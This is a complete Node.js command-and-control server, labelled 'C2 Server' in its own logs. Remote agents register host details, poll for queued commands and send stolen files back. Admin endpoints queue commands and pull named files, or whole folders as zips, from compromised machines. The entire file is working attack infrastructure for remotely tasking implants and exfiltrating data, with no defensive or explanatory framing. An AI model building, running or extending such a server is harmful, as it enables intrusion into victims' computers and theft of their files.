const express = require('express');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const archiver = require('archiver');
const app = express();
const PORT = 3000;
const WS_PORT = 3001;

const CONFIG = {
  storageDir: path.join(__dirname, 'storage'),
  uploadsDir: path.join(__dirname, 'storage', 'uploads'),
  tasksFile: path.join(__dirname, 'storage', 'tasks.json'),
  agentsFile: path.join(__dirname, 'storage', 'agents.json'),
  logFile: path.join(__dirname, 'storage', 'c2.log')
};

fs.ensureDirSync(CONFIG.storageDir);
fs.ensureDirSync(CONFIG.uploadsDir);

function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] [${type}] ${message}\n`;
  fs.appendFileSync(CONFIG.logFile, logEntry);
  console.log(logEntry.trim());
}

class DataStore {
  constructor() {
    this.agents = this.load('agents') || {};
    this.tasks = this.load('tasks') || {};
    this.results = this.load('results') || {};
  }

  load(type) {
    const file = path.join(CONFIG.storageDir, `${type}.json`);
    if (fs.existsSync(file)) {
      try {
        return fs.readJsonSync(file);
      } catch (e) {
        log(`Load error ${type}: ${e.message}`, 'ERROR');
        return null;
      }
    }
    return null;
  }

  save(type, data) {
    const file = path.join(CONFIG.storageDir, `${type}.json`);
    fs.writeJsonSync(file, data, { spaces: 2 });
  }

  registerAgent(agentId, systemInfo) {
    if (!this.agents[agentId]) {
      this.agents[agentId] = {
        id: agentId,
        firstSeen: new Date().toISOString(),
        status: 'active'
      };
    }
    this.agents[agentId] = {
      ...this.agents[agentId],
      ...systemInfo,
      lastSeen: new Date().toISOString(),
      status: 'active'
    };
    this.save('agents', this.agents);
    log(`Agent registered: ${agentId}`, 'AGENT');
    return this.agents[agentId];
  }

  addTask(agentId, command, params = {}) {
    const taskId = uuidv4();
    if (!this.tasks[agentId]) this.tasks[agentId] = [];
    this.tasks[agentId].push({
      id: taskId,
      command,
      params,
      status: 'pending',
      createdAt: new Date().toISOString()
    });
    this.save('tasks', this.tasks);
    log(`Task added for ${agentId}: ${command}`, 'TASK');
    return taskId;
  }

  getPendingTasks(agentId) {
    const agentTasks = this.tasks[agentId] || [];
    const pending = agentTasks.filter(t => t.status === 'pending');
    pending.forEach(t => t.status = 'in_progress');
    this.save('tasks', this.tasks);
    return pending;
  }

  completeTask(agentId, taskId, result) {
    const tasks = this.tasks[agentId] || [];
    const task = tasks.find(t => t.id === taskId);
    if (task) {
      task.status = 'completed';
      task.result = result;
      task.completedAt = new Date().toISOString();
      this.save('tasks', this.tasks);
      
      if (!this.results[agentId]) this.results[agentId] = [];
      this.results[agentId].push({
        taskId,
        command: task.command,
        result,
        completedAt: task.completedAt
      });
      this.save('results', this.results);
      
      log(`Task ${taskId} completed for ${agentId}`, 'TASK');
      return true;
    }
    return false;
  }

  heartbeat(agentId) {
    if (this.agents[agentId]) {
      this.agents[agentId].lastSeen = new Date().toISOString();
      this.save('agents', this.agents);
      return true;
    }
    return false;
  }

  getAgents() {
    return this.agents;
  }

  getAllTasks() {
    return this.tasks;
  }

  getResults() {
    return this.results;
  }
}

const store = new DataStore();

app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.static(path.join(__dirname, 'web')));

function authAgent(req, res, next) {
  const token = req.headers['x-agent-id'];
  if (!token || !store.agents[token]) {
    return res.status(401).json({ 
      error: 'Unauthorized', 
      message: 'Agent not registered' 
    });
  }
  req.agentId = token;
  next();
}

app.post('/api/register', (req, res) => {
  const { agentId, ...systemInfo } = req.body;
  if (!agentId) {
    return res.status(400).json({ error: 'Agent ID required' });
  }
  
  const agent = store.registerAgent(agentId, systemInfo);
  const tasks = store.getPendingTasks(agentId);
  
  res.json({
    status: 'registered',
    agent,
    tasks: tasks.map(t => ({
      id: t.id,
      command: t.command,
      params: t.params
    }))
  });
});

app.get('/api/tasks', authAgent, (req, res) => {
  const tasks = store.getPendingTasks(req.agentId);
  res.json({
    tasks: tasks.map(t => ({
      id: t.id,
      command: t.command,
      params: t.params
    }))
  });
});

app.post('/api/result', authAgent, (req, res) => {
  const { taskId, data } = req.body;
  if (!taskId) {
    return res.status(400).json({ error: 'Task ID required' });
  }
  
  const filename = `result_${req.agentId}_${Date.now()}.json`;
  const filepath = path.join(CONFIG.uploadsDir, filename);
  fs.writeJsonSync(filepath, {
    agentId: req.agentId,
    taskId,
    data,
    receivedAt: new Date().toISOString()
  });
  
  store.completeTask(req.agentId, taskId, { stored: filename });
  res.json({ success: true, filename });
});

app.post('/api/upload', authAgent, (req, res) => {
  const { taskId, filename, content, originalPath, size } = req.body;
  
  if (!content) {
    return res.status(400).json({ error: 'No file content' });
  }
  
  try {
    const buffer = Buffer.from(content, 'base64');
    const finalName = `${req.agentId}_${Date.now()}_${filename}`;
    const finalPath = path.join(CONFIG.uploadsDir, finalName);
    
    fs.writeFileSync(finalPath, buffer);
    
    if (taskId) {
      store.completeTask(req.agentId, taskId, { 
        stored: finalName,
        size: size,
        originalPath: originalPath
      });
    }
    
    log(`File uploaded: ${finalName} from ${req.agentId}`, 'UPLOAD');
    res.json({ 
      success: true, 
      filename: finalName,
      size: size
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/heartbeat', authAgent, (req, res) => {
  store.heartbeat(req.agentId);
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/admin/agents', (req, res) => {
  res.json(store.getAgents());
});

app.get('/api/admin/tasks', (req, res) => {
  res.json(store.getAllTasks());
});

app.get('/api/admin/results', (req, res) => {
  res.json(store.getResults());
});

app.post('/api/admin/task', (req, res) => {
  const { agentId, command, params } = req.body;
  if (!agentId || !command) {
    return res.status(400).json({ error: 'Agent ID and command required' });
  }
  
  const taskId = store.addTask(agentId, command, params || {});
  res.json({ success: true, taskId });
});

app.get('/api/admin/files', (req, res) => {
  const files = fs.readdirSync(CONFIG.uploadsDir)
    .filter(f => !f.startsWith('.'))
    .map(f => {
      const stat = fs.statSync(path.join(CONFIG.uploadsDir, f));
      return {
        name: f,
        size: stat.size,
        modified: stat.mtime
      };
    });
  res.json(files);
});

app.get('/api/admin/download/:filename', (req, res) => {
  const filepath = path.join(CONFIG.uploadsDir, req.params.filename);
  if (fs.existsSync(filepath)) {
    res.download(filepath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

app.post('/api/admin/download-file', async (req, res) => {
  const { agentId, filePath } = req.body;
  
  if (!agentId || !filePath) {
    return res.status(400).json({ error: 'Agent ID and file path required' });
  }
  
  const taskId = store.addTask(agentId, 'upload', { path: filePath });
  
  let attempts = 0;
  while (attempts < 30) {
    const tasks = store.tasks[agentId] || [];
    const task = tasks.find(t => t.id === taskId);
    
    if (task && task.status === 'completed') {
      const result = task.result;
      if (result && result.stored) {
        const filePath = path.join(CONFIG.uploadsDir, result.stored);
        if (fs.existsSync(filePath)) {
          return res.download(filePath, path.basename(filePath));
        }
      }
      return res.status(404).json({ error: 'File not found on server' });
    }
    
    await sleep(1000);
    attempts++;
  }
  
  res.status(408).json({ error: 'Timeout waiting for file' });
});

app.post('/api/admin/download-folder', async (req, res) => {
  const { agentId, folderPath } = req.body;
  
  if (!agentId || !folderPath) {
    return res.status(400).json({ error: 'Agent ID and folder path required' });
  }
  
  const scanTaskId = store.addTask(agentId, 'scan', { path: folderPath, maxDepth: 1 });
  
  let attempts = 0;
  let files = [];
  
  while (attempts < 30) {
    const tasks = store.tasks[agentId] || [];
    const task = tasks.find(t => t.id === scanTaskId);
    
    if (task && task.status === 'completed') {
      const result = task.result;
      if (result && result.stored) {
        const resultPath = path.join(CONFIG.uploadsDir, result.stored);
        if (fs.existsSync(resultPath)) {
          const scanData = fs.readJsonSync(resultPath);
          files = scanData.data.filter(item => !item.isDirectory).map(item => item.path);
          break;
        }
      }
    }
    
    await sleep(1000);
    attempts++;
  }
  
  if (files.length === 0) {
    return res.status(404).json({ error: 'No files found in folder' });
  }
  
  const uploadTasks = [];
  for (const file of files.slice(0, 50)) {
    const taskId = store.addTask(agentId, 'upload', { path: file });
    uploadTasks.push(taskId);
  }
  
  let completed = 0;
  let downloadedFiles = [];
  let attempts2 = 0;
  
  while (completed < uploadTasks.length && attempts2 < 60) {
    const tasks = store.tasks[agentId] || [];
    for (const taskId of uploadTasks) {
      const task = tasks.find(t => t.id === taskId);
      if (task && task.status === 'completed' && task.result && task.result.stored) {
        if (!downloadedFiles.includes(task.result.stored)) {
          downloadedFiles.push(task.result.stored);
          completed++;
        }
      }
    }
    await sleep(1000);
    attempts2++;
  }
  
  const zipFileName = `folder_${agentId}_${Date.now()}.zip`;
  const zipPath = path.join(CONFIG.uploadsDir, zipFileName);
  
  const output = fs.createWriteStream(zipPath);
  const archive = archiver('zip', { zlib: { level: 9 } });
  
  await new Promise((resolve, reject) => {
    archive.pipe(output);
    
    for (const file of downloadedFiles) {
      const filePath = path.join(CONFIG.uploadsDir, file);
      if (fs.existsSync(filePath)) {
        archive.file(filePath, { name: file });
      }
    }
    
    archive.on('error', reject);
    output.on('close', resolve);
    archive.finalize();
  });
  
  res.download(zipPath, zipFileName);
});

const wss = new WebSocket.Server({ port: WS_PORT });

wss.on('connection', (ws) => {
  log('WebSocket client connected', 'WS');
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      ws.send(JSON.stringify({ 
        type: 'echo', 
        data, 
        timestamp: new Date().toISOString() 
      }));
    } catch (e) {
      log(`WS error: ${e.message}`, 'ERROR');
    }
  });
  
  ws.on('close', () => {
    log('WebSocket client disconnected', 'WS');
  });
  
  ws.send(JSON.stringify({
    type: 'agents',
    data: store.getAgents()
  }));
});

app.listen(PORT, '0.0.0.0', () => {
  log(`C2 Server running on http://localhost:${PORT}`, 'START');
  log(`WebSocket on ws://localhost:${WS_PORT}`, 'START');
  log(`Storage: ${CONFIG.storageDir}`, 'START');
  log(`Uploads: ${CONFIG.uploadsDir}`, 'START');
});

setInterval(() => {
  const agentCount = Object.keys(store.agents).length;
  const taskCount = Object.values(store.tasks).reduce((acc, arr) => acc + arr.length, 0);
  log(`Status: ${agentCount} agents, ${taskCount} tasks`, 'STATUS');
}, 60000);

process.on('SIGINT', () => {
  log('Server stopped', 'SHUTDOWN');
  process.exit(0);
});
